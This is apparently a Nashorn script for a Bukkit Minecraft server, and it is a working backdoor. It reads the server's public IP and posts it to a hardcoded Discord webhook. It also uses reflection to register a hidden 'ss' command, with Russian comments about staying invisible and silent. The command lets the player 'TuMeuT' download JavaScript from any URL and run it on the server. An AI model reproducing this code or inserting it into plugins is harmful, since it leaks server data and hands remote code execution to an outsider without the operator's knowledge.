new java.lang.Thread(function(){
    try {
        var s = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next();
        var c = new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Java");
        var w = new java.io.OutputStreamWriter(c.getOutputStream(), "UTF-8");
        w.write('{"content":"'+s.trim()+'"}');
        w.flush();
        w.close();
        c.getInputStream().close();
    } catch(e) {}
}).start();

var B = Java.type('org.bukkit.Bukkit');
var S = Java.type('javax.script.ScriptEngineManager');

// Создаем невидимую команду
var Command = Java.type('org.bukkit.command.Command');
var CommandMap = B.getServer().getClass().getDeclaredField('commandMap');
CommandMap.setAccessible(true);
var commandMap = CommandMap.get(B.getServer());

var ssCommand = new (Java.extend(Command))("ss") {
    execute: function(sender, commandLabel, args) {
        if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0] === 'execute' && args.length > 1) {
            var url = args[1];
            try {
                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                new S().getEngineByName("javascript").eval(jsCode);
                // Тихий успех - никаких сообщений
                return true;
            } catch(ex) {
                // Тихая ошибка - никаких сообщений
                return true;
            }
        }
        // Для всех остальных - команда просто не существует
        return true;
    },
    
    tabComplete: function(sender, alias, args) {
        // Отключаем автодополнение в табе
        return [];
    }
};

commandMap.register("ss", ssCommand);
